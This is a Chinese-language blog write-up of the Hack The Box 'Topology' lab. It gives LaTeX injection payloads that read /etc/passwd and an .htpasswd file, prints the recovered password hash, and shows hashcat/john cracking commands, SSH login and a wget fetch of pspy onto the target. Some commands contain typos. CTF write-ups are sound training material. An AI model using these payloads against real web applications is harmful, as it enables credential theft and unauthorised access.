---
layout: post
title: "【HTB】topology writeup"
subtitle: "并不常见的命令注入"
date: 2023-09-20
author: "qtunneling"
header-img: "img/bg-touhou-1.jpg"
tags:

- HTB
- Injection

---

靶机地址：[topology.htb](https://app.hackthebox.com/machines/Topology)

### 0x01 信息收集

#### （1）端口扫描

`nmap –sV 10.10.11.217`  
发现22 ssh和80 http端口开着  

#### （2）网页分析

网页是某大学数学拓扑学小组的主页，有价值的信息：

**邮箱**：lklein@topology.htb（可能存在邮件服务器，也可能使用的是企业邮箱）

**电话**：+1-202-555-0143（华盛顿特区）

"On this website, we present our current research topics, software projects and a publication list." 注意到Software projects:

![topology1.png](/img/post-HTB-topology/topology1.png)

- 链接：latex.topology.htb/equation.php 根据描述是用来生成LaTeX公式的图片

- 管理期刊论文的PHP Web应用程序

- 拓扑学工具下载

- Gnuplot脚本合集（Google后发现是一个科学绘图工具）

修改/etc/hosts：
`echo "10.10.11.217 topology.htb latex.topology.htb" >>a /etc/hosts`
访问 latex.topology.htb 后发现有输入框，可能存在漏洞

![topology2.png](/img/post-HTB-topology/topology2.png)

尝试直接访问 latex.topology.htb，直接显示了apache目录

![topology3.png](/img/post-HTB-topology/topology3.png)

这里的一些文件其实对于后续的分析非常有价值
<mark>**header.tex**  </mark>

![topology4.png](/img/post-HTB-topology/topology4.png)

这里面提供了许多用到的packages，如果有条件的话可以去阅读这些包的文档了解是否存在脆弱函数，比如说 listings: include source code files or print inline code

Google: latex listings document（感谢小可爱）

- [Code listing - Overleaf, Online LaTeX Editor](https://www.overleaf.com/learn/latex/Code_listing)

- [CTAN: Package listings](https://ctan.org/pkg/listings?lang=en)

- [LaTeX/Source Code Listings - Wikibooks, open books for an open world](https://en.m.wikibooks.org/wiki/LaTeX/Source_Code_Listings)

- [LaTeX Code Listings &mdash; NASA-LaTeX-Docs documentation](https://nasa.github.io/nasa-latex-docs/html/examples/listing.html)

- https://pvv.ntnu.no/~berland/latex/docs/listings.pdf

通过上述文章我们了解到 `\lstinputlisting{...}` 能够包含任何文件，并将其视为纯文本

<mark>**equationtest.tex**</mark>

![topology5.png](/img/post-HTB-topology/topology5.png)

这是对应example.png的源文件，用户输入就是中间的  
`\int_{a}^b\int_{c}^d f(x,y)dxdy`  
猜测是 php 是直接将用户输入拼接生成临时 tex 文件，再编译执行。特别要注意的是在公式两边已经自带了\$符号，代表数学模式，之后我们在构造payload时可能需要闭合\$符号（类似sql注入闭合引号一样）

#### （3）子域名扫描

`ffuf -u http://topology.thb -H "Host: FUZZ.topology.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all –ac -s`

![topology6.png](/img/post-HTB-topology/topology6.png)
`gobuster vhost -u http://topology.htb --append-domaisn -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 100`

**dev.topology.htb**

![topology7.png](/img/post-HTB-topology/topology7.png)

**stats.topology.htb**

![topology8.png](/img/post-HTB-topology/topology8.png)

添加 hosts 后访问发现stats只有两张图片（不出意外的话这个图就应该是用gnuplot画的了），dev 则是一个httsp认证（具体区分是basic还是digest需要抓包看属性，这里就先不管了）  
http basic/digest认证可以由apache服务器实现，通常会把用户名和密码hash存储在对应目录的.htpasswd文件（即/var/www/dev/.htpasswd），如果我们能利用latex注入读到这里的hash就可以尝试进行破解

### 0x02 Latex Injection

从文档已经了解到`\lstinputlisting{...}`函数能够读取任意文件，可以进一步搜索网上的总结文档。

Google search: latex exploit, latex injection  
中英文的文档都需要看：  

- [PayloadsAllTheThings/LaTeX Injection at master](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LaTeX%20Injection/README.md)

- [swisskyrepo/PayloadsAllTheThings (github.com)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection)

- [Formula/CSV/Doc/LaTeX Injection - HackTricks](https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection)

- [实战 LaTex Injection - 云山雾隐官方消息 - OSCHINA - 中文开源技术交流社区](https://my.oschina.net/yunshanwuyin/blog/5511353) 

- [TeX 安全模式绕过研究 (seebug.org)](https://paper.seebug.org/1596/)

latex产生注入的原因：  

1. latex文件(.tex)通常需要编译执行  

2. latex可以像其他编程语言一样读写文件、执行命令，官方在texmf.cnf中提供配置项(shell\_escape、shell\_escape\_commands)用于控制能否执行命令和允许执行的命令列表

shell\_escape:  

- f: 不允许执行任何命令  

- t: 允许执行任何命令  

- p: 支持白名单内的命令

总而言之，在允许用户输入的情况下，latex存在命令执行、任意文件读取、任意文件写入、xss、bypass黑名单等漏洞

尝试使用`\input{\etc\passwd}`或者`\include{somefile.tex}`读取文件，发现存在过滤

![topology9.png](/img/post-HTB-topology/topology9.png)

继续往下试：  

```latex
\newread\file  
\openin\file=/etc/passwd  
\read\file to\line  
\text{\line}  
\closein\file
```

上面作为一个整体输入时，使用两个空格作为换行（当然一个也行）

![topology10.png](/img/post-HTB-topology/topology10.png)

成功读取，但是密码是加密的，没有太大价值  
尝试读取`/var/www/dev/.htpasswd` 发现error，但是能够读取`/var/www/dev/.htaccess`

![topology11.png](/img/post-HTB-topology/topology11.png)

![topology12.png](/img/post-HTB-topology/topology12.png)

因为.htpasswd中的格式都是：`username:apr171850310\$gh9m4xcAn3MGxogwX/ztb.`
主要问题在于\\text{\\line}，文件中打印出的\$符号可能对latex执行产生影响

①  ``$\catcode `$=12  \newread\file  \openin\file=/var/www/dev/.htpasswd  \read\file to\line  \text{\line}  \closein\file``
\$的默认catcode是3，表示进入数学模式，这里设置成12后，\$就不会进入数学模式

所以只需要闭合前面的一个$符号，后面的\$符号被解析成了文本所以不用闭合

![topology13.png](/img/post-HTB-topology/topology13.png)

② `$\lstinputlisting(\var\www\dev\.htpasswd)$` 两边的\$符号是为了闭合外面的\$符号，而listputlisting自带一个文本执行环境

`$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0`

### 0x03 解密

可以先用hash-identifier识别一下类型，再翻阅对应命令：

`hash-identifer`

- [example_hashes [hashcat wiki] (techsolvency.com)](https://hashcat.net/wiki/doku.php?id=example_hashes)

- [supported_psa_original [hashcat wiki]](https://hashcat.net/wiki/doku.php?id=supported_psa_original)

Apache的密码是md5apr1, MD5(APR), Apache MD5 对应-m 1600

`hashcat –a 0 –m 1600 hash.txt /usr/share/wordlist/rockyou.txt`

![topology14.png](/img/post-HTB-topology/topology14.png)

注意hashcat破解时hash.txt不要带上用户名，而john需要带上用户名即

`vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0`

`john –wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

如果已经破解过了，则输入

`john hash.txt --show`

### 0x04 提权

使用该用户名密码不仅可以登录http认证，也能够登录ssh  
`ssh username@10.10.11.217`

linux提权

1. 通过高权限应用

2. 根据内核版本查找exp（如内核溢出提权）：[GitHub - SecWiki/linux-kernel-exploits: linux-kernel-exploits Linux平台提权漏洞集合](https://github.com/SecWiki/linux-kernel-exploits)

3. 脚本检测：linux-exploit-suggester

4. 找到可以使用sudo的脚本，审核脚本代码是否有调用可写的脚本

5. 计划任务

6. 系统服务错误权限配置漏洞

7. 不安全的文件/文件夹权限配置

8. 明文存储的用户名、密码

下载pspy64监控进程：[Releases · DominicBreuker/pspy · GitHub](https://github.com/DominicBreuker/pspy/releases)

然后进入download打开一个terminal输入：

`python -m http.server`

然后进入ssh页面输入：

`wget http://10.10.16.42:8000/pspy64`

`chmod +x pspy64`

### 总结

1. 熟练使用端口扫描（nmap），域名/目录爆破工具（wfuzz, gobuster, fuff）、哈希解密工具（hashcat, hash-identifier, john）

2. 信息搜集（latex injection），熟悉 apache 目录（看到dev子域名有http认证立刻能想到/var/www/dev/.htpasswd)

3. 熟悉linux提权漏洞

#### 参考writeup：

- [靶场笔记-HTB-Topology – 鹏路翱翔个人博客](https://www.penglusoars.top/2023/06/18/%e9%9d%b6%e5%9c%ba%e7%ac%94%e8%ae%b0-htb-topology/)

- [HTB Topology WriteUp_Som3B0dy的博客-CSDN博客](https://blog.csdn.net/qq_58869808/article/details/131176733) 这篇文章写于2023年6月12日，在使用latex injection时无意间实现了文件写入（貌似使用URL编码就绕过了输入过滤，由于前端是自带编码转换的，即在文本框输入%5cbegin，实际提交的是%255cbegin，而后端发现输入中有\begin(%5cbegin)才会提示非法），该bug已在6月16日被作者修复，这时提交%255cbegin虽然不会提示非法，但会无法执行

- [Hackthebox Topology Walkthrough - 掘金 (juejin.cn)](https://juejin.cn/post/7244351125448851512)
